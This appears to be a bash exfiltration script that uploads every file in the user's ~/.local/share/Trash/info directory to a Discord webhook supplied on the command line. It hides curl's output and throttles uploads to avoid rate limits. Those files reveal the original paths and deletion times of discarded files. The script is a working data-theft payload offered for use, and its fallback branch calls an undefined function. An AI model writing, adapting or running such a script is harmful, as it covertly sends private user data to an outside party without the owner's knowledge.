#!/bin/bash

# Function to send a file to Discord
send_file_to_discord() {
  local FILE_PATH="$1"
  local USERNAME="$2"
  local JSON=$(jq -n --arg user "$USERNAME" '{"username": $user}')
  local FILE_SIZE=$(stat -c%s "$FILE_PATH")
  
  if (( FILE_SIZE <= 25000000 )); then
       curl -X POST -H "Content-Type: multipart/form-data" -F "file=@$FILE_PATH" -F "payload_json=$JSON" "$WEBHOOK_URL" > /dev/null 2>&1  
  fi
}

# Parsing command-line arguments
while [[ $# -gt 0 ]]; do
    key="$1"

    case $key in
        -w|--webhook)
            WEBHOOK_URL="$2"
            shift
            shift
            ;;
        *)
            shift
            ;;
    esac
done

# Check if webhook URL is provided
if [ -z "$WEBHOOK_URL" ]; then
    echo "Error: Webhook URL not provided."
    exit 1
fi

# Function to list and send all files from the ~/.local/share/Trash/info directory
send_trash_info_files() {
  local TRASH_INFO_DIR="$HOME/.local/share/Trash/info"
  if [ -d "$TRASH_INFO_DIR" ]; then
    for FILE in "$TRASH_INFO_DIR"/*; do
      if [ -f "$FILE" ]; then
        send_file_to_discord "$FILE" "Trash Info Sender"
        sleep 1  # Add a delay to avoid rate limiting (adjust as needed)
      fi
    done
  else
    send_to_discord "Trash Info Sender" "The ~/.local/share/Trash/info directory does not exist."
  fi
}

# Call the function to send trash info files
send_trash_info_files
